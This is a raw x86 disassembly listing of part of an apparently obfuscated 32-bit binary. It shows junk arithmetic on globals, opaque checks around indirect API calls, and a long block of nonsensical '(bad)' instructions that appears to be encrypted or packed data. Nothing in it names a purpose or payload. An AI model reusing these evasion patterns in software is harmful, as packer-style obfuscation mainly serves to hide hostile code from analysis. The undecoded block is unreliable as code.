  41fa2b:	or     DWORD PTR ds:0x4282e3,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x42828f
  41fa3b:	and    DWORD PTR ds:0x42814f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42823b,0x42817b
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x428283,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x428267,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x4282f7,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x428187
  41fa8d:	mov    DWORD PTR ds:0x42817f,0x4079
  41fa97:	cmp    DWORD PTR ds:0x428267,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x428073
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e28
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428143
  41fabc:	sbb    ecx,DWORD PTR ds:0x42823b
  41fac2:	mov    DWORD PTR ds:0x428143,ecx
  41fac8:	xor    DWORD PTR ds:0x42828b,edx
  41face:	movzx  ecx,WORD PTR ds:0x428243
  41fad5:	or     DWORD PTR ds:0x4282db,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x42836b
  41fae3:	add    DWORD PTR ds:0x42827f,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x42815b
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x42818b,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x4282ef
  41fb06:	mov    DWORD PTR ds:0x428373,edx
  41fb0c:	mov    DWORD PTR ds:0x42814f,ebx
  41fb12:	mov    DWORD PTR ds:0x4282f7,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x42818b,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e2c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x428393
  41fb48:	or     ecx,DWORD PTR ds:0x428263
  41fb4e:	mov    DWORD PTR ds:0x428393,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x42815b
  41fb5a:	add    ecx,DWORD PTR ds:0x428393
  41fb60:	mov    DWORD PTR ds:0x42815b,ecx
  41fb66:	sbb    DWORD PTR ds:0x42827b,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x42828f
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42823f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428247,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x42817f,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x428277,0x42827b
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x42838b,0x4282f3
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x42835f,0x0
  41fbc2:	mov    DWORD PTR ds:0x42818b,ebx
  41fbc8:	mov    DWORD PTR ds:0x428397,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x428267,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x428167,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x42835f,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x4280cf
  41fbfd:	call   DWORD PTR ds:0x428e30
  41fc03:	and    ecx,DWORD PTR ds:0x428253
  41fc09:	adc    DWORD PTR ds:0x4282e3,ecx
  41fc0f:	sub    DWORD PTR ds:0x4282eb,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x42835b
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42821b
  41fc21:	mov    DWORD PTR ds:0x42835b,ecx
  41fc27:	and    DWORD PTR ds:0x428303,0x55d2
  41fc31:	add    DWORD PTR ds:0x42817f,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x42826f,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x42827f
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42814b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x428267,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42821f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x428283,ebx
  41fc7a:	mov    DWORD PTR ds:0x428297,0x2746
  41fc84:	mov    DWORD PTR ds:0x428267,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x42815b,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42821f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428ea4
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x428393
  41fcc1:	and    DWORD PTR ds:0x42815b,0x42830f
  41fccb:	mov    ecx,DWORD PTR ds:0x428163
  41fcd1:	xor    DWORD PTR ds:0x42822f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x428277
  41fcde:	sub    DWORD PTR ds:0x428383,ecx
  41fce4:	mov    DWORD PTR ds:0x428233,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x428397
  41fd0b:	add    eax,DWORD PTR ds:0x42815f
  41fd11:	mov    ds:0x428397,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x428303,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x4282eb
  41fd39:	mov    ecx,DWORD PTR ds:0x42837b
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42821b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x428303,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e34
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x428263,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42823f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x4282a3
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x42828f,ecx
  41fd92:	sbb    DWORD PTR ds:0x428383,0x42830b
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x4282ff,0x428303
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x42816f,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x42835f
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x42835f
  41fe15:	xor    DWORD PTR ds:0x428367,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x42815f,0x0
  41fe51:	not    DWORD PTR ds:0x42828b
  41fe57:	mov    DWORD PTR ds:0x428227,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x42815f,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e38
  41fe7d:	and    DWORD PTR ds:0x428377,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42822f
  41fe8d:	movzx  ecx,WORD PTR ds:0x428307
  41fe94:	and    DWORD PTR ds:0x4282e3,ecx
  41fe9a:	and    DWORD PTR ds:0x428257,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x42819b
  41feab:	mov    ecx,DWORD PTR ds:0x4283cf
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x42817f
  41fed3:	or     DWORD PTR ds:0x428393,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x42825b,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x42835f,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x4282db,ecx
  41ff06:	cmp    DWORD PTR ds:0x42825b,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428143
  41ff18:	call   DWORD PTR ds:0x428ea8
  41ff1e:	or     ecx,DWORD PTR ds:0x428163
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x428307,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42822b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0x2a
  41ff55:	add    eax,0x2323be3d
  41ff5a:	push   ss
  41ff5b:	sbb    BYTE PTR [ebx+0x39181812],ah
  41ff61:	scas   al,BYTE PTR es:[edi]
  41ff62:	mov    al,ds:0xdf0668f6
  41ff67:	out    dx,al
  41ff68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff6a:	loope  0x41ff42
  41ff6c:	mov    esp,0x585fd594
  41ff71:	mov    ds:0xdc1a1f16,al
  41ff76:	fcmovnu st,st(2)
  41ff78:	gs pop ss
  41ff7a:	cmp    dl,bh
  41ff7c:	shl    DWORD PTR [ecx+edi*4],0x33
  41ff80:	adc    ebp,esp
  41ff82:	pop    ss
  41ff83:	pop    ebp
  41ff84:	repz int3 
  41ff86:	lods   al,BYTE PTR ds:[esi]
  41ff87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff88:	mov    ds:0x690bdb5,al
  41ff8d:	lock xchg esi,eax
  41ff8f:	int    0xad
  41ff91:	jbe    0x41ff7e
  41ff93:	ror    esi,0x59
  41ff96:	push   ebp
  41ff97:	sti    
  41ff98:	push   es
  41ff99:	retf   
  41ff9a:	push   ds
  41ff9b:	les    ebx,FWORD PTR ds:0xee16c353
  41ffa1:	pop    edi
  41ffa2:	ret    
  41ffa3:	cs jns 0x41ffa6
  41ffa6:	push   ecx
  41ffa7:	fs jne 0x41ff65
  41ffaa:	jp     0x41ff32
  41ffac:	iret   
  41ffad:	call   0x244d316b
  41ffb2:	sahf   
  41ffb3:	out    0x95,al
  41ffb5:	dec    ebx
  41ffb6:	jl     0x41ffed
  41ffb8:	mov    ah,0xb4
  41ffba:	inc    esi
  41ffbb:	dec    edx
  41ffbc:	lods   al,BYTE PTR ds:[esi]
  41ffbd:	les    ebx,FWORD PTR [edi-0x15068359]
  41ffc3:	sti    
  41ffc4:	jl     0x41ffc2
  41ffc6:	cli    
  41ffc7:	push   cs
  41ffc8:	jge    0x41ff87
  41ffca:	mov    ds:0xa570c3dc,al
  41ffcf:	pop    edi
  41ffd0:	icebp  
  41ffd1:	loope  0x420022
  41ffd3:	ins    BYTE PTR es:[edi],dx
  41ffd4:	pop    eax
  41ffd5:	(bad)  
  41ffd6:	fst    DWORD PTR [edx+0x6]
  41ffd9:	or     esi,DWORD PTR ds:0xfe011de7
  41ffdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffe0:	jbe    0x41ffbb
  41ffe2:	test   al,0xc6
  41ffe4:	dec    ebp
  41ffe5:	inc    eax
  41ffe6:	xchg   esi,eax
  41ffe7:	inc    edi
  41ffe8:	push   cs
  41ffe9:	mov    al,0xbb
  41ffeb:	push   0x25
  41ffed:	leave  
  41ffee:	jge    0x42005b
  41fff0:	ds in  al,0x56
  41fff3:	clc    
  41fff4:	or     edi,DWORD PTR [esp+edx*8+0x3143645f]
  41fffb:	sbb    DWORD PTR [ebx-0x38053cf1],eax
  420001:	add    dh,BYTE PTR [edx]
  420003:	xchg   ecx,eax
  420004:	inc    edx
  420005:	es mov al,bl
  420008:	jmp    0xa44a3e15
  42000d:	adc    eax,0x9aece0a6
  420012:	mov    DWORD PTR [edx-0x25],esp
  420015:	xchg   BYTE PTR [ecx],bh
  420017:	in     eax,dx
  420018:	(bad)  
  420019:	(bad)  
  42001b:	sbb    al,0x9e
  42001d:	mov    edx,fs
  42001f:	push   ds
  420020:	jne    0x42000d
  420022:	jno    0x41ffc0
  420024:	daa    
  420025:	pop    es
  420026:	mov    eax,ds:0x219d1093
  42002b:	mov    cl,ah
  42002d:	mov    al,ds:0xcee09fa7
  420032:	(bad)  
  420033:	xor    ch,bl
  420035:	xchg   edx,eax
  420036:	sub    al,0x24
  420038:	mov    esi,0x206bd2e
  42003d:	pop    ebp
  42003e:	inc    esp
  42003f:	fldenv [esi]
  420041:	mov    ds:0x580e1422,eax
  420046:	(bad)  
  420047:	std    
  420048:	mov    al,0xd
  42004a:	(bad)  
  42004b:	push   cs
  42004c:	fisub  WORD PTR [ecx-0x3cc88f81]
  420052:	icebp  
  420053:	retf   
  420054:	pop    ecx
  420055:	call   0x9c2e0991
  42005a:	fdiv   QWORD PTR [edi-0x43258c1a]
  420060:	mov    cl,0xfe
  420062:	cmp    cl,BYTE PTR [edx+0x28d0ac5]
  420068:	sbb    ah,dh
  42006a:	cs imul eax,edx,0xd085ccc
  420071:	js     0x4200cd
  420073:	out    0x79,al
  420075:	loopne 0x420088
  420077:	pop    ss
  420078:	push   DWORD PTR [esi-0x6a21878e]
  42007e:	hlt    
  42007f:	aad    0xe1
  420081:	push   esp
  420082:	jnp    0x420074
  420084:	jne    0x420015
  420086:	push   DWORD PTR [esi-0xb106d8e]
  42008c:	imul   edx,esi,0x2b321cc6
  420092:	xchg   edi,eax
  420093:	xchg   esi,eax
  420094:	call   0xc595:0x6c8cb44b
  42009b:	ds jne 0x420080
  42009e:	test   eax,0xf0ba206b
  4200a3:	xlat   BYTE PTR ds:[ebx]
  4200a4:	lahf   
  4200a5:	in     eax,dx
  4200a6:	jmp    0x4200f4
  4200a8:	push   edx
  4200a9:	mov    ds:0x374bd2c1,eax
  4200ae:	jns    0x420091
  4200b0:	jnp    0x420127
  4200b2:	cwde   
  4200b3:	push   es
  4200b4:	cmc    
  4200b5:	cmc    
  4200b6:	xchg   ebx,eax
  4200b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200b8:	je     0x420128
  4200ba:	mov    dh,0xed
  4200bc:	jecxz  0x420111
  4200be:	dec    esi
  4200bf:	aas    
  4200c0:	gs nop
  4200c2:	inc    edx
  4200c3:	jbe    0x42004d
  4200c5:	jg     0x420064
  4200c7:	aaa    
  4200c8:	imul   esp,esi,0x32
  4200cb:	stos   DWORD PTR es:[edi],eax
  4200cc:	ror    BYTE PTR [edi],cl
  4200ce:	inc    edi
  4200cf:	fist   DWORD PTR [ecx]
  4200d1:	daa    
  4200d2:	and    edx,DWORD PTR [edx+0x25]
  4200d5:	mov    edi,0x65cb021a
  4200da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200db:	(bad)  
  4200dc:	and    ch,BYTE PTR [esi-0x7c]
  4200df:	fld    DWORD PTR [eax-0x7b]
  4200e2:	mov    es,WORD PTR [edi-0x3e]
  4200e5:	xchg   ecx,eax
  4200e6:	in     eax,0xb5
  4200e8:	data16 stos BYTE PTR es:[edi],al
  4200ea:	xchg   edx,eax
  4200eb:	jbe    0x42009d
  4200ed:	jmp    0x420168
  4200ef:	clc    
  4200f0:	fcom   st(0)
  4200f2:	hlt    
  4200f3:	call   0xbf82:0x6d5d9a2c
  4200fa:	lock cmp DWORD PTR ds:0xd66196cc,ecx
  420101:	mov    cl,0xc8
  420103:	dec    eax
  420104:	jae    0x420090
  420106:	retf   0x4c35
  420109:	mov    esi,0x8689fb94
  42010e:	push   0xffffffea
  420110:	lods   eax,DWORD PTR ds:[esi]
  420111:	jno    0x4200db
  420113:	mov    ds:0xeca724bd,al
  420118:	pop    edi
  420119:	xchg   edx,eax
  42011a:	stc    
  42011b:	stos   DWORD PTR es:[edi],eax
  42011c:	and    BYTE PTR [eax],dh
  42011e:	(bad)  
  420120:	mov    bh,0x8c
  420122:	xchg   ebx,eax
  420123:	lods   al,BYTE PTR ds:[esi]
  420124:	popf   
  420125:	inc    esp
  420126:	dec    ebx
  420127:	not    BYTE PTR [ebx+0x44]
  42012a:	jne    0x42017c
  42012c:	je     0x4201aa
  42012e:	(bad)  
  42012f:	bound  esp,QWORD PTR [ecx]
  420131:	mov    ah,0xde
  420133:	push   ds
  420134:	xchg   ebx,eax
  420135:	ror    DWORD PTR [esi],1
  420137:	adc    BYTE PTR gs:0xc315c505,dl
  42013e:	(bad)  [ebx-0x3f]
  420141:	cmp    DWORD PTR ds:0x2c54e868,0xffffffba
  420148:	sahf   
  420149:	pop    ecx
  42014a:	push   ebp
  42014b:	int3   
  42014c:	xchg   ebx,eax
  42014d:	leave  
  42014e:	adc    BYTE PTR [ebx],dh
  420150:	retf   
  420151:	push   0x68
  420153:	xchg   esp,eax
  420154:	add    DWORD PTR [edx+0x4a],edi
  420157:	or     BYTE PTR [esi-0xa],dl
  42015a:	test   ebx,0x8923b698
  420160:	adc    DWORD PTR [edi],eax
  420162:	sub    BYTE PTR [esi-0x2a],bl
  420165:	adc    dh,BYTE PTR [eax+edi*8+0x7]
  420169:	(bad)  
  42016b:	cwde   
  42016c:	xor    bh,cl
  42016e:	adc    DWORD PTR [edx+ebp*8+0x7c],edx
  420172:	fst    DWORD PTR [edi-0x6b]
  420175:	mov    ebp,0xe3e865ea
  42017a:	add    BYTE PTR [ebp+edx*4+0x540c62d5],cl
  420181:	add    ah,BYTE PTR [edi]
  420183:	inc    ebx
  420184:	cmp    al,0xde
  420186:	cmp    dh,bl
  420188:	mov    ds:0x27c36777,al
  42018d:	je     0x4201f6
  42018f:	pop    ecx
  420190:	xchg   esp,eax
  420191:	pop    ds
  420192:	jae    0x4201fa
  420194:	push   esp
  420195:	xlat   BYTE PTR ds:[ebx]
  420196:	fsub   QWORD PTR [ebx-0x21]
  420199:	and    al,0x13
  42019b:	stc    
  42019c:	pushf  
  42019d:	aas    
  42019e:	or     al,0xb8
  4201a0:	enter  0x4b31,0xbc
  4201a4:	pop    ebp
  4201a5:	and    DWORD PTR [ecx+0x6e2b5f6f],0x68
  4201ac:	sub    bl,BYTE PTR [ecx]
  4201ae:	dec    esi
  4201af:	test   al,0x19
  4201b1:	outs   dx,BYTE PTR ds:[esi]
  4201b2:	sar    DWORD PTR [edi+0x7ed39f11],1
  4201b8:	fistp  WORD PTR [esi+0x7f]
  4201bb:	sbb    eax,0x1b49c6a
  4201c0:	aad    0x5c
  4201c2:	aam    0x1f
  4201c4:	loop   0x4201a8
  4201c6:	mov    DWORD PTR [ebp+0x11],ebx
  4201c9:	test   eax,0xeca6a5e4
  4201ce:	sub    dl,ch
  4201d0:	lods   eax,DWORD PTR ds:[esi]
  4201d1:	rol    BYTE PTR [ebp+0x5ea8f1e3],1
  4201d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201d8:	xcrypt-ctr (bad)
  4201d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201da:	fwait
  4201db:	loop   0x420185
  4201dd:	jae    0x420213
  4201df:	sbb    ebp,eax
  4201e1:	aad    0x87
  4201e3:	push   cs
  4201e4:	dec    edi
  4201e5:	pop    ebx
  4201e6:	fwait
  4201e7:	xchg   ebx,eax
  4201e8:	inc    esp
  4201e9:	pop    ss
  4201ea:	jg     0x42023f
  4201ec:	leave  
  4201ed:	call   0x3b5:0xb45ad162
  4201f4:	xor    eax,0x4f97997
  4201f9:	imul   bl
  4201fb:	rsqrtps xmm1,XMMWORD PTR [edi]
  4201fe:	jbe    0x4201da
  420200:	jnp    0x42018c
  420202:	sbb    DWORD PTR [ecx+0x43],edx
  420205:	lea    eax,[esi+ecx*8]
  420208:	ficom  DWORD PTR [edi+0x13136793]
  42020e:	fidiv  WORD PTR [edi]
  420210:	xor    ebp,DWORD PTR [ebx]
  420212:	scas   eax,DWORD PTR es:[edi]
  420213:	(bad)  
  420214:	ss push esi
  420216:	add    ecx,DWORD PTR [esi+esi*1]
  420219:	sbb    al,0x20
  42021b:	int    0x29
  42021d:	mov    dl,0xa7
  42021f:	(bad)  
  420220:	ins    BYTE PTR es:[edi],dx
  420221:	(bad)  
  420222:	mov    ah,0xb6
  420224:	into   
  420225:	retf   
  420226:	xor    DWORD PTR [ebp-0x21],0xffffffac
  42022a:	(bad)  
  42022c:	mov    edx,0x29e84816
  420231:	xchg   edx,eax
  420232:	ja     0x420208
  420234:	jmp    ebp
  420236:	jmp    0x420269
  420238:	std    
  420239:	mov    esp,0x69de1fa4
  42023e:	or     eax,0xa0095369
  420243:	pop    esp
  420244:	fcomp  st(5)
  420246:	mov    ecx,DWORD PTR ss:[ebx+0x4a97d10a]
  42024d:	jle    0x420225
  42024f:	mov    cl,0x6b
  420251:	push   ecx
  420252:	sbb    ecx,DWORD PTR [ecx+0xf]
  420255:	jne    0x420269
  420257:	jmp    0x3211:0x6eed6a5a
  42025e:	xor    al,0x15
  420260:	fcomp  QWORD PTR [ecx]
  420262:	stc    
  420263:	popaw  
  420265:	cmp    ebx,DWORD PTR [eax-0x35]
  420268:	sbb    al,0x75
  42026a:	inc    ecx
  42026b:	jl     0x420221
  42026d:	and    DWORD PTR [ebp-0x34],0x2a
  420271:	xor    eax,esi
  420273:	pop    edx
  420274:	mov    ch,0xe8
  420276:	lods   eax,DWORD PTR ds:[esi]
  420277:	adc    ebp,DWORD PTR [ecx-0x60]
  42027a:	push   esi
  42027b:	popf   
  42027c:	js     0x420225
  42027e:	fs inc esi
  420280:	loop   0x42028c
  420282:	add    eax,0xf7a2b14c
  420287:	repz and BYTE PTR [esi+0x73275a72],0x60
  42028f:	xor    BYTE PTR [esp+edi*8+0x7c5acfb9],ch
  420296:	mov    bh,0x1f
  420298:	cmp    BYTE PTR [edi-0x2],dh
  42029b:	xor    cl,cl
  42029d:	imul   ebp,DWORD PTR [ebx-0x1137275],0xd81ffff
  4202a7:	jg     0x42022b
  4202a9:	inc    edx
  4202aa:	add    bl,bh
  4202ac:	add    BYTE PTR [edx+0x0],0x2b
  4202b0:	ror    DWORD PTR [ebx+0x4283770d],0x0
  4202b7:	add    DWORD PTR ds:0x4282ff,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x42837b,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x428157,0x428277
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x42836b,0x42814f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x428263,0x42821b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x4282fb,0x0
  42030c:	mov    DWORD PTR ds:0x428253,edx
  420312:	mov    esi,DWORD PTR ds:0x42821b
  420318:	mov    DWORD PTR ds:0x4282f7,ebx
  42031e:	mov    DWORD PTR ds:0x428307,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x428173,0x3019
  420337:	not    DWORD PTR ds:0x4282fb
  42033d:	cmp    DWORD PTR ds:0x4282fb,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x42835b
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428eac
  420363:	adc    ecx,DWORD PTR ds:0x428233
  420369:	xor    DWORD PTR ds:0x4282ef,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x42820b
  420377:	mov    esi,DWORD PTR ds:0x4282c3
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x428177,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x4282eb,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x428367,0x0
  4203b4:	mov    DWORD PTR ds:0x42828f,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x42818b
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42824f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42824b,edi
  4203db:	cmp    DWORD PTR ds:0x428367,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x427fdf
  4203ed:	call   DWORD PTR ds:0x428eb0
  4203f3:	movzx  esi,WORD PTR ds:0x428167
  4203fa:	add    DWORD PTR ds:0x4282e7,esi
  420400:	adc    DWORD PTR ds:0x428187,ebx
  420406:	add    DWORD PTR ds:0x428363,0x22a2
  420410:	and    esi,DWORD PTR ds:0x428363
  420416:	or     DWORD PTR ds:0x42835f,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x4282e3
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x428263,0x0
  42042e:	mov    DWORD PTR ds:0x428363,0x5615
  420438:	mov    DWORD PTR ds:0x42815b,0x419b
  420442:	mov    DWORD PTR ds:0x42817f,0x389d
  42044c:	not    DWORD PTR ds:0x428253
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x428263,0x0
  420463:	je     0x4204a0
  420469:	push   0x42822f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428eb4
  420477:	sub    DWORD PTR ds:0x4282e7,0x6950
  420481:	movzx  esi,WORD PTR ds:0x42825b
  420488:	xor    esi,DWORD PTR ds:0x42830b
  42048e:	mov    DWORD PTR ds:0x42825b,esi
  420494:	mov    esi,DWORD PTR ds:0x428243
  42049a:	or     DWORD PTR ds:0x4282df,esi
  4204a0:	xor    DWORD PTR ds:0x42830f,ecx
  4204a6:	add    DWORD PTR ds:0x42830f,ebx
  4204ac:	or     DWORD PTR ds:0x428367,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x42817b,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x42815f,ebx
